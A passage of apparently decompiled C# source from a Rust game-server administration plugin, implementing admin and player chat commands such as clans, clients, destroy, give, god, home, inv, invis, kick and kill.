                if (str.Contains("%CLANS.LIST%"))
                {
                    string text = str.Replace("%CLANS.LIST%", "");
                    foreach (ClanData data in Clans.Database.Values)
                    {
                        string str3 = Config.GetMessageClan("Command.Clans.Info", data, Sender, null);
                        if (str3.Length > 30)
                        {
                            text = text.Trim(new char[] { ',', ' ' });
                            if (text.Length > 0)
                            {
                                Broadcast.Message(Sender, text, null, 0f);
                            }
                            Broadcast.Message(Sender, str3, null, 0f);
                            text = "";
                        }
                        else
                        {
                            text = text + str3 + ", ";
                            if (text.Length > 60)
                            {
                                Broadcast.Message(Sender, text.Trim(new char[] { ',', ' ' }), null, 0f);
                                text = "";
                            }
                        }
                    }
                    if (text.Length > 0)
                    {
                        Broadcast.Message(Sender, text.Substring(0, text.Length - 2), null, 0f);
                    }
                }
                else if (!str.Contains("%CLANS."))
                {
                    Broadcast.Message(Sender, str, null, 0f);
                }
            }
        }

        public static void Clients(ConsoleSystem.Arg arg)
        {
            string message = "Total clients: " + PlayerClient.All.Count + Environment.NewLine;
            foreach (uLink.NetworkPlayer player in NetCull.connections)
            {
                PlayerClient playerClient = Helper.GetPlayerClient(player);
                if (playerClient != null)
                {
                    int rank = Users.GetRank(playerClient.userID);
                    string str2 = "";
                    if (Core.Ranks.ContainsKey(rank))
                    {
                        str2 = Core.Ranks[rank];
                    }
                    object obj2 = message;
                    message = string.Concat(new object[] { obj2, "<", playerClient.netPlayer.id, "> - <", playerClient.userID, "> - <", playerClient.netUser.displayName, "> - <", str2, "> - <IP='", playerClient.netUser.networkPlayer.ipAddress, "'>", Environment.NewLine });
                }
            }
            if (arg.argUser == null)
            {
                ConsoleSystem.Print(message, false);
            }
            else
            {
                arg.Reply = message;
                Broadcast.Message(arg.argUser, Config.GetMessage("Command.Clients", arg.argUser, null), null, 0f);
            }
        }

        public static void ConfigManage(NetUser Sender, string Command, string[] Args)
        {
            if ((Args != null) && (Args.Length > 0))
            {
                string str;
                if (((str = Args[0]) != null) && (str == "reload"))
                {
                    Config.Initialize();
                    Economy.Initialize();
                    Core.InitializeLoadout();
                    if (!Config.Initialized)
                    {
                        Broadcast.Notice(Sender, "✘", "Server Management: Error of initialize configuration.", 5f);
                    }
                    else if (!Economy.Initialized)
                    {
                        Broadcast.Notice(Sender, "✘", "Server Management: Error of initialize economy system.", 5f);
                    }
                    else if (!Core.LoadoutInitialized)
                    {
                        Broadcast.Notice(Sender, "✘", "Server Management: Error of initialize loadout system.", 5f);
                    }
                    else
                    {
                        Broadcast.Notice(Sender, "✔", "Server Management: Configuration has been initialized.", 5f);
                    }
                }
                else
                {
                    Broadcast.Notice(Sender, "✘", Config.GetMessageCommand("Command.InvalidSyntax", Command, null), 5f);
                }
            }
        }

        public static void Destroy(NetUser Sender, UserData userData, string Command, string[] Args)
        {
            if (Sender.admin)
            {
                int num = 0;
                UserData bySteamID = null;
                if ((Args != null) && (Args.Length > 0))
                {
                    if (Args[0].Equals("BANNED", StringComparison.OrdinalIgnoreCase))
                    {
                        foreach (StructureMaster master in StructureMaster.AllStructures)
                        {
                            if (Users.GetBySteamID(master.ownerID).Flags.Has<UserFlags>(UserFlags.banned) || Banned.Database.ContainsKey(master.ownerID))
                            {
                                Helper.DestroyStructure(master);
                                num++;
                            }
                        }
                        if (num > 0)
                        {
                            Broadcast.Notice(Sender, "✔", "You destroy " + num + " structures of banned user(s)", 5f);
                        }
                        else
                        {
                            Broadcast.Notice(Sender, "✔", "Not nothing for destroy", 5f);
                        }
                    }
                    else if (Args[0].Equals("UNUSED", StringComparison.OrdinalIgnoreCase))
                    {
                        foreach (StructureMaster master2 in StructureMaster.AllStructures)
                        {
                            if (Users.GetBySteamID(master2.ownerID) == null)
                            {
                                Helper.DestroyStructure(master2);
                                num++;
                            }
                        }
                        if (num > 0)
                        {
                            Broadcast.Notice(Sender, "✔", "You destroy " + num + " structures of unused user(s)", 5f);
                        }
                        else
                        {
                            Broadcast.Notice(Sender, "✔", "Not nothing for destroy", 5f);
                        }
                    }
                    else
                    {
                        bySteamID = Users.Find(Args[0]);
                        if (bySteamID == null)
                        {
                            Broadcast.Notice(Sender, "✘", Config.GetMessage("Command.PlayerNoFound", Sender, Args[0]), 5f);
                        }
                        else
                        {
                            foreach (StructureMaster master3 in StructureMaster.AllStructures)
                            {
                                if (master3.ownerID == bySteamID.SteamID)
                                {
                                    num += Helper.DestroyStructure(master3);
                                }
                            }
                            Broadcast.Notice(Sender, "✔", string.Concat(new object[] { "You destroy ", num, " objects owned by \"", bySteamID.Username, "\"" }), 5f);
                            Helper.Log(string.Concat(new object[] { "User [", userData.Username, ":", userData.SteamID, "] has destroy ", num, " objects owned by [", bySteamID.Username, ":", bySteamID.SteamID, "]." }), true);
                        }
                    }
                }
                else
                {
                    RaycastHit hit;
                    IDBase component = null;
                    if (Physics.Raycast(Sender.playerClient.controllable.character.eyesRay, out hit, 1000f, -1))
                    {
                        component = hit.collider.GetComponent<IDBase>();
                    }
                    if (component == null)
                    {
                        Broadcast.Notice(Sender, "✘", "You don't see anything for destroy.", 3f);
                    }
                    else
                    {
                        StructureMaster idMain = component.idMain as StructureMaster;
                        if (idMain == null)
                        {
                            Broadcast.Notice(Sender, "✘", "There are nothing for destroy.", 3f);
                        }
                        else
                        {
                            bySteamID = Users.GetBySteamID(idMain.ownerID);
                            num = Helper.DestroyStructure(idMain);
                            Broadcast.Notice(Sender, "✔", string.Concat(new object[] { "You destroy ", num, " objects owned by \"", (bySteamID != null) ? bySteamID.Username : "-", "\"" }), 5f);
                            Helper.Log(string.Concat(new object[] { "User [", userData.Username, ":", userData.SteamID, "] has destroy ", num, " objects at ", idMain.transform.position, " owned by [", (bySteamID != null) ? (bySteamID.Username + ":" + bySteamID.SteamID) : "-:-", "]." }), true);
                        }
                    }
                }
            }
            else if (Core.DestoryOwnership.ContainsKey(Sender.userID))
            {
                Core.DestoryOwnership.Remove(Sender.userID);
                Broadcast.Notice(Sender, "☢", Config.GetMessage("Command.Destroy.Disabled", Sender, null), 5f);
            }
            else
            {
                Core.DestoryOwnership.Add(Sender.userID, DateTime.Now.AddSeconds((double) Core.OwnershipDestroyAutoDisable));
                Broadcast.Notice(Sender, "☢", Config.GetMessage("Command.Destroy.Enabled", Sender, null), 5f);
            }
        }

        public static void Details(NetUser Sender, UserData userData, string Command, string[] Args)
        {
            userData.ToggleFlag(UserFlags.details);
            Broadcast.Message(Sender, userData.HasFlag(UserFlags.details) ? "ON" : "OFF", "DETAILS", 0f);
        }

        public static void Food(NetUser Sender, UserData userData, string Command, string[] Args)
        {
            if ((Args != null) && (Args.Length != 0))
            {
                if (((Args.Length > 1) && (Sender != null)) && (!Sender.admin && !userData.HasFlag(UserFlags.admin)))
                {
                    Args = Args.Remove<string>(Args[0]);
                }
                NetUser player = Sender;
                string s = Args[0];
                if (Args.Length > 1)
                {
                    player = Helper.GetNetUser(Args[0]);
                    s = Args[1];
                }
                if (player == null)
                {
                    Broadcast.Notice(Sender, "✘", Config.GetMessage("Command.PlayerNoFound", Sender, Args[0]), 5f);
                }
                else
                {
                    Character idMain = player.playerClient.controllable.idMain;
                    if (idMain != null)
                    {
                        Metabolism component = idMain.GetComponent<Metabolism>();
                        if (component != null)
                        {
                            float calorieLevel = component.GetCalorieLevel();
                            float result = 0f;
                            if (float.TryParse(s, out result))
                            {
                                if (result > calorieLevel)
                                {
                                    component.AddCalories(result - calorieLevel);
                                }
                                if (result < calorieLevel)
                                {
                                    component.SubtractCalories(calorieLevel - result);
                                }
                                Helper.Log(string.Concat(new object[] { userData.Username, " set ", result, " food for \"", player.displayName, "\"" }), true);
                                if (Sender != null)
                                {
                                    Broadcast.Notice(player, "✔", "Your calories now is " + result, 5f);
                                    if (Sender != player)
                                    {
                                        Broadcast.Notice(Sender, "✔", string.Concat(new object[] { "You set ", result, " calories for ", player.displayName }), 5f);
                                    }
                                }
                            }
                        }
                    }
                }
            }
            else
            {
                Broadcast.Notice(Sender, "✘", Config.GetMessageCommand("Command.InvalidSyntax", Command, Sender), 5f);
            }
        }

        public static void Freeze(NetUser Sender, UserData userData, string Command, string[] Args)
        {
            if ((Args != null) && (Args.Length != 0))
            {
                if (Args[0].Equals("ALL", StringComparison.CurrentCultureIgnoreCase))
                {
                    Core.PlayersFreezed = !Core.PlayersFreezed;
                    Broadcast.Notice(Sender, "✔", "All players now " + (Core.PlayersFreezed ? "FREEZED" : "unfreezed"), 5f);
                }
                else
                {
                    userData = Users.Find(Args[0]);
                    if (userData == null)
                    {
                        Broadcast.Notice(Sender, "✘", Config.GetMessage("Command.PlayerNoFound", Sender, Args[0]), 5f);
                    }
                    else
                    {
                        userData.ToggleFlag(UserFlags.freezed);
                        Broadcast.Notice(Sender, "✔", "You " + (userData.HasFlag(UserFlags.freezed) ? "freeze" : "unfreeze") + " " + userData.Username, 5f);
                    }
                }
            }
            else
            {
                Broadcast.Notice(Sender, "✘", Config.GetMessageCommand("Command.InvalidSyntax", Command, Sender), 5f);
            }
        }

        public static void Give(NetUser Sender, UserData userData, string Command, string[] Args)
        {
            if ((Args != null) && (Args.Length != 0))
            {
                NetUser player = Sender;
                int result = -1;
                int num2 = 1;
                string name = Args[0];
                ItemDataBlock byName = DatablockDictionary.GetByName(name);
                if ((Args.Length >= 3) && !int.TryParse(Args[2], out result))
                {
                    result = -1;
                }
                if ((Args.Length >= 2) && !int.TryParse(Args[1], out num2))
                {
                    num2 = 1;
                }
                if (byName == null)
                {
                    player = Helper.GetNetUser(Args[0]);
                    if (player == null)
                    {
                        Broadcast.Notice(Sender, "✘", Config.GetMessage("Command.PlayerNoFound", Sender, name), 5f);
                        return;
                    }
                    if (Args.Length < 2)
                    {
                        Broadcast.Notice(Sender, "✘", Config.GetMessageCommand("Command.InvalidSyntax", Command, Sender), 5f);
                        return;
                    }
                    name = Args[1];
                    byName = DatablockDictionary.GetByName(name);
                    if ((Args.Length >= 4) && !int.TryParse(Args[3], out result))
                    {
                        result = -1;
                    }
                    if ((Args.Length >= 3) && !int.TryParse(Args[2], out num2))
                    {
                        num2 = 1;
                    }
                }
                if (player == null)
                {
                    Broadcast.Notice(Sender, "✘", Config.GetMessage("Command.PlayerNoFound", Sender, name), 5f);
                }
                else if (byName == null)
                {
                    Broadcast.Notice(Sender, "✘", Config.GetMessage("Command.ItemNoFound", Sender, name), 5f);
                }
                else
                {
                    num2 = Helper.GiveItem(player.playerClient, byName, num2, result);
                    string str2 = "\"" + byName.name + "\"";
                    if (num2 > 1)
                    {
                        str2 = num2.ToString() + " " + str2;
                    }
                    if (num2 == 0)
                    {
                        Broadcast.Notice(Sender, "✘", "Failed to give " + str2 + ", inventory is full.", 5f);
                    }
                    else
                    {
                        if ((Sender != null) && (Sender != player))
                        {
                            Broadcast.Notice(Sender, "✔", "You give " + str2 + " into " + player.displayName + " inventory.", 5f);
                        }
                        Helper.Log(userData.Username + " give " + str2 + " into " + player.displayName + " inventory.", true);
                        Broadcast.Notice(player, "✔", "You received " + str2 + " into your inventory.", 5f);
                    }
                }
            }
            else
            {
                Broadcast.Notice(Sender, "✘", Config.GetMessageCommand("Command.InvalidSyntax", Command, Sender), 5f);
            }
        }

        public static void God(NetUser Sender, UserData userData, string Command, string[] Args)
        {
            if ((Args != null) && (Args.Length > 0))
            {
                userData = Users.Find(Args[0]);
            }
            if (userData == null)
            {
                Broadcast.Notice(Sender, "✘", Config.GetMessage("Command.PlayerNoFound", Sender, Args[0]), 5f);
            }
            else
            {
                userData.ToggleFlag(UserFlags.godmode);
                Broadcast.Notice(Sender, "✔", "You " + (userData.HasFlag(UserFlags.godmode) ? "enable" : "disable") + " god mode for " + userData.Username, 5f);
            }
        }

        public static void Goto(NetUser Sender, string Command, string[] Args)
        {
            if ((Args != null) && (Args.Length != 0))
            {
                int result = 0;
                if (!int.TryParse(Args[0], out result))
                {
                    result = -1;
                }
                if (result == -1)
                {
                    Broadcast.Notice(Sender.networkPlayer, "✘", Config.GetMessageCommand("Command.InvalidSyntax", Command, null), 5f);
                }
                else
                {
                    if (result == 0)
                    {
                        result = 1;
                    }
                    if (result > NetCull.connections.Length)
                    {
                        result = NetCull.connections.Length;
                    }
                    uLink.NetworkPlayer player = NetCull.connections[result - 1];
                    PlayerClient playerClient = Helper.GetPlayerClient(player);
                    if (playerClient != null)
                    {
                        Helper.TeleportTo(Sender, playerClient.lastKnownPosition);
                    }
                }
            }
            else
            {
                Broadcast.Notice(Sender.networkPlayer, "✘", Config.GetMessageCommand("Command.InvalidSyntax", Command, null), 5f);
            }
        }

        public static void Health(NetUser Sender, UserData userData, string Command, string[] Args)
        {
            if ((Args != null) && (Args.Length != 0))
            {
                if (((Args.Length > 1) && (Sender != null)) && (!Sender.admin && !userData.HasFlag(UserFlags.admin)))
                {
                    Args = Args.Remove<string>(Args[0]);
                }
                NetUser player = Sender;
                string s = Args[0];
                if (Args.Length > 1)
                {
                    player = Helper.GetNetUser(Args[0]);
                    s = Args[1];
                }
                if (player == null)
                {
                    Broadcast.Notice(Sender, "✘", Config.GetMessage("Command.PlayerNoFound", Sender, Args[0]), 5f);
                }
                else
                {
                    Character idMain = player.playerClient.controllable.idMain;
                    if (idMain != null)
                    {
                        HumanBodyTakeDamage takeDamage = idMain.takeDamage as HumanBodyTakeDamage;
                        if (takeDamage != null)
                        {
                            float health = takeDamage.health;
                            if (float.TryParse(s, out health))
                            {
                                if (health <= 100f)
                                {
                                    takeDamage.maxHealth = 100f;
                                }
                                else
                                {
                                    takeDamage.maxHealth = health;
                                }
                                if (health >= takeDamage.health)
                                {
                                    takeDamage.Heal(idMain.idMain, health - takeDamage.health);
                                }
                                else
                                {
                                    TakeDamage.HurtSelf(idMain.idMain, takeDamage.health - health, null);
                                }
                                Helper.Log(string.Concat(new object[] { userData.Username, " set ", health, " health for \"", player.displayName, "\"" }), true);
                                if (Sender != null)
                                {
                                    Broadcast.Notice(player, "✔", "Your health now is " + health, 5f);
                                    if (Sender != player)
                                    {
                                        Broadcast.Notice(Sender, "✔", string.Concat(new object[] { "You set ", health, " health for ", player.displayName }), 5f);
                                    }
                                }
                            }
                        }
                    }
                }
            }
            else
            {
                Broadcast.Notice(Sender, "✘", Config.GetMessageCommand("Command.InvalidSyntax", Command, Sender), 5f);
            }
        }

        public static void Help(NetUser Sender, UserData userData, string[] Args, System.Collections.Generic.List<string> userCommands)
        {
            Predicate<string> match = null;
            Predicate<string> predicate2 = null;
            Class5 class2 = new Class5 {
                string_0 = Args
            };
            if ((class2.string_0 != null) && (class2.string_0.Length != 0))
            {
                if (match == null)
                {
                    match = new Predicate<string>(class2.method_0);
                }
                string str4 = userCommands.Find(match);
                if (string.IsNullOrEmpty(str4))
                {
                    if (predicate2 == null)
                    {
                        predicate2 = new Predicate<string>(class2.method_1);
                    }
                    str4 = userCommands.Find(predicate2);
                }
                if (string.IsNullOrEmpty(str4))
                {
                    Broadcast.Notice(Sender.networkPlayer, "✘", Config.GetMessage("Command.NotAvailabled", Sender, null), 5f);
                }
                else
                {
                    string[] strArray3 = str4.Split(new char[] { '=' });
                    if (strArray3.Length < 3)
                    {
                        Broadcast.Notice(Sender.networkPlayer, "✘", Config.GetMessage("Command.Help.NotFound", Sender, null), 5f);
                    }
                    else
                    {
                        foreach (string str5 in strArray3[2].Split(new string[] { @"\r\n", @"\n" }, StringSplitOptions.RemoveEmptyEntries))
                        {
                            Broadcast.Message(Sender, "[Help for /" + class2.string_0[0].Replace(".", "") + "]: " + str5, null, 0f);
                        }
                    }
                }
            }
            else
            {
                foreach (string str in Config.GetMessages("Help.Message", Sender))
                {
                    if (str.Contains("%COMMAND_LIST%"))
                    {
                        string str2 = str.Replace("%COMMAND_LIST%", "");
                        foreach (string str3 in userCommands)
                        {
                            string[] strArray2 = str3.Split(new char[] { '=' });
                            str2 = str2 + "/" + strArray2[1].Replace(".", "") + ", ";
                            if (str2.Length >= 70)
                            {
                                Broadcast.Message(Sender, str2.Substring(0, str2.Length - 2), null, 0f);
                                str2 = "";
                            }
                        }
                        if (str2 != "")
                        {
                            Broadcast.Message(Sender, str2.Substring(0, str2.Length - 2), null, 0f);
                        }
                    }
                    else
                    {
                        Broadcast.Message(Sender, str, null, 0f);
                    }
                }
            }
        }

        public static void History(NetUser Sender, UserData userData, string Command, string[] Args)
        {
            if (Core.History.ContainsKey(Sender.userID))
            {
                System.Collections.Generic.List<HistoryRecord> list = Core.History[Sender.userID];
                int result = 0;
                if (Args.Length > 0)
                {
                    int.TryParse(Args[0], out result);
                }
                if (result < 1)
                {
                    result = Core.ChatHistoryDisplay;
                }
                if (result > list.Count)
                {
                    result = list.Count;
                }
                for (int i = result; i > 0; i--)
                {
                    Broadcast.Message(Sender, list[list.Count - i].Name + ": " + list[list.Count - i].Text, "HISTORY", 0f);
                }
            }
        }

        public static void Home(NetUser Sender, UserData userData, string Command, string[] Args)
        {
            System.Collections.Generic.List<Vector3> playerSpawns;
            Vector3 lastKnownPosition;
            Class9 class2 = new Class9 {
                netUser_0 = Sender,
                string_0 = Command
            };
            int result = -1;
            if (((Args != null) && (Args.Length > 0)) && ((class2.netUser_0 != null) && class2.netUser_0.admin))
            {
                UserData data = Users.Find(Args[0]);
                if (data == null)
                {
                    Broadcast.Notice(class2.netUser_0, "✘", Config.GetMessage("Command.PlayerNoFound", class2.netUser_0, Args[0]), 5f);
                }
                else
                {
                    lastKnownPosition = class2.netUser_0.playerClient.lastKnownPosition;
                    playerSpawns = Helper.GetPlayerSpawns(data.SteamID, false);
                    if (playerSpawns.Count == 0)
                    {
                        Broadcast.Notice(class2.netUser_0, "✘", "Player \"" + data.Username + "\" not have a camp.", 5f);
                    }
                    else
                    {
                        if ((Args.Length > 1) && int.TryParse(Args[1], out result))
                        {
                            result--;
                            if (result < 0)
                            {
                                result = 0;
                            }
                            else if (result >= playerSpawns.Count)
                            {
                                result = playerSpawns.Count - 1;
                            }
                        }
                        else
                        {
                            for (int i = 0; i < playerSpawns.Count; i++)
                            {
                                if (Vector3.Distance(lastKnownPosition, playerSpawns[i]) < 3f)
                                {
                                    result = ++i;
                                }
                            }
                            if (result < 0)
                            {
                                result = 0;
                            }
                            else if (result >= playerSpawns.Count)
                            {
                                result = 0;
                            }
                        }
                        Broadcast.Notice(class2.netUser_0, "☢", string.Concat(new object[] { "You moved on \"", data.Username, "\" home spawn ", result + 1, " of ", playerSpawns.Count }), 5f);
                        Helper.TeleportTo(class2.netUser_0, playerSpawns[result]);
                    }
                }
            }
            else
            {
                lastKnownPosition = class2.netUser_0.playerClient.lastKnownPosition;
                playerSpawns = Helper.GetPlayerSpawns(class2.netUser_0.playerClient, true);
                if (playerSpawns.Count == 0)
                {
                    Broadcast.Notice(class2.netUser_0, "✘", Config.GetMessageCommand("Command.Home.NoCamp", "", class2.netUser_0), 5f);
                }
                else
                {
                    for (int j = 0; j < playerSpawns.Count; j++)
                    {
                        if (Vector3.Distance(lastKnownPosition, playerSpawns[j]) < 3f)
                        {
                            result = j++;
                        }
                    }
                    if (((Args != null) && (Args.Length > 0)) && Args[0].Equals("LIST", StringComparison.OrdinalIgnoreCase))
                    {
                        foreach (string str in Config.GetMessages("Command.Home.List", class2.netUser_0))
                        {
                            if (!str.Contains("%HOME.NUM%") && !str.Contains("%HOME.POSITION%"))
                            {
                                Broadcast.Message(class2.netUser_0, Helper.ReplaceVariables(class2.netUser_0, str, null, "").Replace("%HOME.COUNT%", playerSpawns.Count.ToString()), null, 0f);
                            }
                            else
                            {
                                for (int k = 0; k < playerSpawns.Count; k++)
                                {
                                    int num6 = k + 1;
                                    Broadcast.Message(class2.netUser_0, str.Replace("%HOME.NUM%", num6.ToString()).Replace("%HOME.POSITION%", playerSpawns[k].AsString()), null, 0f);
                                }
                            }
                        }
                    }
                    else
                    {
                        if (Core.CommandHomeOutdoorsOnly)
                        {
                            foreach (Collider collider in Physics.OverlapSphere(class2.netUser_0.playerClient.controllable.character.transform.position, 1f, 0x10360401))
                            {
                                IDMain main = IDBase.GetMain(collider);
                                if (main != null)
                                {
                                    StructureMaster component = main.GetComponent<StructureMaster>();
                                    if ((component != null) && (component.ownerID != class2.netUser_0.userID))
                                    {
                                        UserData bySteamID = Users.GetBySteamID(component.ownerID);
                                        if ((bySteamID == null) || !bySteamID.HasShared(class2.netUser_0.userID))
                                        {
                                            Broadcast.Notice(class2.netUser_0, "☢", Config.GetMessage("Command.Home.NotHere", class2.netUser_0, null), 5f);
                                            return;
                                        }
                                    }
                                }
                            }
                        }
                        Countdown countdown = Users.CountdownList(userData.SteamID).Find(new Predicate<Countdown>(class2.method_0));
                        if (countdown != null)
                        {
                            if (!countdown.Expired)
                            {
                                TimeSpan span = TimeSpan.FromSeconds(countdown.TimeLeft);
                                if (span.TotalHours > 0.0)
                                {
                                    Broadcast.Notice(class2.netUser_0, "✘", Config.GetMessage("Command.Home.Countdown", class2.netUser_0, null).Replace("%TIME%", string.Format("{0}:{1:D2}:{2:D2}", span.TotalHours, span.Minutes, span.Seconds)), 5f);
                                    return;
                                }
                                if (span.TotalMinutes > 0.0)
                                {
                                    Broadcast.Notice(class2.netUser_0, "✘", Config.GetMessage("Command.Home.Countdown", class2.netUser_0, null).Replace("%TIME%", string.Format("{0}:{1:D2}", span.Minutes, span.Seconds)), 5f);
                                    return;
                                }
                                Broadcast.Notice(class2.netUser_0, "✘", Config.GetMessage("Command.Home.Countdown", class2.netUser_0, null).Replace("%TIME%", string.Format("{0}", span.Seconds)), 5f);
                                return;
                            }
                            Users.CountdownRemove(userData.SteamID, countdown);
                        }
                        EventTimer item = Events.Timer.Find(new Predicate<EventTimer>(class2.method_1));
                        if ((item != null) && (item.TimeLeft > 0.0))
                        {
                            Broadcast.Notice(class2.netUser_0, "☢", Config.GetMessage("Command.Home.Wait", class2.netUser_0, null).Replace("%TIME%", item.TimeLeft.ToString()), 5f);
                        }
                        else
                        {
                            if (item != null)
                            {
                                item.Dispose();
                                Events.Timer.Remove(item);
                            }
                            if (((Args != null) && (Args.Length > 0)) && int.TryParse(Args[0], out result))
                            {
                                result--;
                            }
                            if (result < 0)
                            {
                                result = 0;
                            }
                            else if (result >= playerSpawns.Count)
                            {
                                result = playerSpawns.Count - 1;
                            }
                            if (Economy.Enabled && (Core.CommandHomePayment > 0L))
                            {
                                UserEconomy economy = Economy.Get(userData.SteamID);
                                string newValue = Core.CommandHomePayment.ToString("N0") + Economy.CurrencySign;
                                if (economy.Balance < Core.CommandHomePayment)
                                {
                                    Broadcast.Notice(class2.netUser_0, "☢", Config.GetMessage("Command.Home.NoEnoughCurrency", class2.netUser_0, null).Replace("%PRICE%", newValue), 5f);
                                    return;
                                }
                            }
                            item = Events.TimeEvent_HomeWarp(class2.netUser_0, class2.string_0, (double) Core.CommandHomeTimewait, playerSpawns[result]);
                            if ((item != null) && (item.TimeLeft > 0.0))
                            {
                                Broadcast.Notice(class2.netUser_0, "☢", Config.GetMessageCommand("Command.Home.Start", "", class2.netUser_0).Replace("%TIME%", item.TimeLeft.ToString()), 5f);
                            }
                        }
                    }
                }
            }
        }

        public static void Inv(NetUser Sender, UserData userData, string Command, string[] Args)
        {
            string str = null;
            PlayerClient playerClient = null;
            if ((Args != null) && (Args.Length > 0))
            {
                playerClient = Helper.GetPlayerClient(Args[0]);
                if (Args.Length > 1)
                {
                    str = Args[1];
                }
                if (playerClient == null)
                {
                    str = Args[0];
                }
            }
            if ((Sender != null) && (playerClient == null))
            {
                playerClient = Sender.playerClient;
            }
            Inventory component = playerClient.controllable.GetComponent<Inventory>();
            Inventory toInv = (Sender != null) ? Sender.playerClient.controllable.GetComponent<Inventory>() : null;
            if (str != null)
            {
                switch (str.ToUpper())
                {
                    case "CLEAR":
                        component.DeactivateItem();
                        component.Clear();
                        playerClient.controllable.GetComponent<AvatarSaveRestore>().ClearAvatar();
                        Broadcast.Notice(Sender, "✔", "Inventory of \"" + playerClient.netUser.displayName + "\" has been cleared.", 5f);
                        return;

                    case "DROP":
                        Inventory inventory3;
                        component.DeactivateItem();
                        DropHelper.DropInventoryContents(component, out inventory3);
                        if (Sender != null)
                        {
                            TimedLockable lockable = inventory3.gameObject.GetComponent<TimedLockable>();
                            if (lockable == null)
                            {
                                lockable = inventory3.gameObject.AddComponent<TimedLockable>();
                            }
                            lockable.SetOwner(Sender.userID);
                            lockable.LockFor(player.backpackLockTime);
                            inventory3.GetComponent<LootableObject>().lifeTime = lockable.lockTime;
                        }
                        playerClient.controllable.GetComponent<AvatarSaveRestore>().ClearAvatar();
                        Broadcast.Notice(Sender, "✔", "Inventory of \"" + playerClient.netUser.displayName + "\" has been dropped.", 5f);
                        return;
                }
                Broadcast.Notice(Sender, "✘", Config.GetMessageCommand("Command.InvalidSyntax", Command, Sender), 5f);
            }
            else if (Sender != null)
            {
                if ((component != toInv) && !dictionary_0.ContainsKey(Sender))
                {
                    dictionary_0.Add(Sender, toInv.GenerateOptimizedInventoryListing(Inventory.Slot.KindFlags.Armor | Inventory.Slot.KindFlags.Belt | Inventory.Slot.KindFlags.Default));
                }
                else if ((component == toInv) && dictionary_0.ContainsKey(Sender))
                {
                    component.DeactivateItem();
                    component.Clear();
                    for (int i = 0; i < dictionary_0[Sender].Length; i++)
                    {
                        IInventoryItem item = component.AddItem(ref dictionary_0[Sender][i].addition);
                        toInv.MoveItemAtSlotToEmptySlot(component, item.slot, dictionary_0[Sender][i].item.slot);
                    }
                    dictionary_0.Remove(Sender);
                    if (userData.Flags.Has<UserFlags>(UserFlags.invis))
                    {
                        Helper.EquipArmor(Sender.playerClient, "Invisible Helmet", true);
                        Helper.EquipArmor(Sender.playerClient, "Invisible Vest", true);
                        Helper.EquipArmor(Sender.playerClient, "Invisible Pants", true);
                        Helper.EquipArmor(Sender.playerClient, "Invisible Boots", true);
                    }
                    Broadcast.Notice(Sender, "✔", "Your inventory has been restored.", 5f);
                    return;
                }
                if ((component != toInv) && dictionary_0.ContainsKey(Sender))
                {
                    Inventory.Transfer[] transferArray = component.GenerateOptimizedInventoryListing(Inventory.Slot.KindFlags.Armor | Inventory.Slot.KindFlags.Belt | Inventory.Slot.KindFlags.Default);
                    toInv.DeactivateItem();
                    toInv.Clear();
                    if (transferArray.Length > 0)
                    {
                        for (int j = 0; j < transferArray.Length; j++)
                        {
                            IInventoryItem item2 = toInv.AddItem(ref transferArray[j].addition);
                            toInv.MoveItemAtSlotToEmptySlot(toInv, item2.slot, transferArray[j].item.slot);
                        }
                    }
                    Broadcast.Notice(Sender, "✔", "Inventory of \"" + playerClient.netUser.displayName + "\" copied into your inventory.", 5f);
                }
                else
                {
                    Broadcast.Notice(Sender, "✘", Config.GetMessageCommand("Command.InvalidSyntax", Command, Sender), 5f);
                }
            }
        }

        public static void Invis(NetUser netUser, UserData userData)
        {
            netUser.playerClient.controllable.GetComponent<Inventory>();
            if (userData.HasFlag(UserFlags.invis))
            {
                Users.SetFlags(userData.SteamID, UserFlags.invis, false);
                Helper.ClearArmor(netUser.playerClient);
                if (Helper.userArmor.ContainsKey(netUser.userID))
                {
                    foreach (string str in Helper.userArmor[netUser.userID])
                    {
                        Helper.EquipArmor(netUser.playerClient, str, false);
                    }
                }
                Broadcast.Notice(netUser.networkPlayer, "✔", "You now is visibled.", 5f);
            }
            else
            {
                Users.SetFlags(userData.SteamID, UserFlags.invis, true);
                System.Collections.Generic.List<IInventoryItem> items = new System.Collections.Generic.List<IInventoryItem>();
                if (Helper.GetEquipedArmor(netUser.playerClient, out items))
                {
                    foreach (IInventoryItem item in items)
                    {
                        Helper.userArmor[netUser.userID].Add(item.datablock.name);
                    }
                }
                Helper.EquipArmor(netUser.playerClient, "Invisible Helmet", true);
                Helper.EquipArmor(netUser.playerClient, "Invisible Vest", true);
                Helper.EquipArmor(netUser.playerClient, "Invisible Pants", true);
                Helper.EquipArmor(netUser.playerClient, "Invisible Boots", true);
                Broadcast.Notice(netUser.networkPlayer, "✔", "You now is invisibled. Reconnect to make your name invisible.", 5f);
            }
        }

        public static void Kick(NetUser Sender, UserData userData, string Command, string[] Args)
        {
            if ((Args != null) && (Args.Length != 0))
            {
                PlayerClient playerClient = Helper.GetPlayerClient(Args[0]);
                if (playerClient == null)
                {
                    Broadcast.Notice(Sender, "✘", Config.GetMessage("Command.PlayerNoFound", Sender, Args[0]), 5f);
                }
                else if ((Sender != null) && (userData.Rank <= Users.GetRank(playerClient.userID)))
                {
                    Broadcast.Notice(Sender, "✘", "You are not allowed to kick a player of higher rank.", 5f);
                }
                else
                {
                    if (Sender == null)
                    {
                        ConsoleSystem.Print("User " + playerClient.userName + " was kicked.", false);
                    }
                    else
                    {
                        Broadcast.Notice(Sender, "✔", "User " + playerClient.userName + " was kicked.", 5f);
                        Broadcast.Notice(playerClient.netPlayer, "☢", "You was a kicked from server by " + Sender.displayName, 5f);
                        Helper.Log("\"" + playerClient.userName + "\" was a kicked from server by \"" + Sender.displayName + "\"", true);
                    }
                    playerClient.netUser.Kick(NetError.NoError, true);
                }
            }
            else
            {
                Broadcast.Notice(Sender, "✘", Config.GetMessageCommand("Command.InvalidSyntax", Command, Sender), 5f);
            }
        }

        public static void KickAll(ConsoleSystem.Arg arg)
        {
            RustServerManagement.Get().KickAllPlayers();
            Helper.Log("All players was kicked by \"" + arg.argUser.displayName + "\".", true);
        }

        public static void Kill(NetUser Sender, UserData userData, string Command, string[] Args)
        {
            if ((Args != null) && (Args.Length != 0))
            {
                PlayerClient playerClient = Helper.GetPlayerClient(Args[0]);
                if (playerClient == null)
                {
                    Broadcast.Notice(Sender.networkPlayer, "✘", Config.GetMessage("Command.PlayerNoFound", Sender, Args[0]), 5f);
                }
                else if (userData.Rank <= Users.GetRank(playerClient.userID))
                {
                    Broadcast.Notice(Sender.networkPlayer, "✘", "You are not allowed to kill a player of higher rank.", 5f);
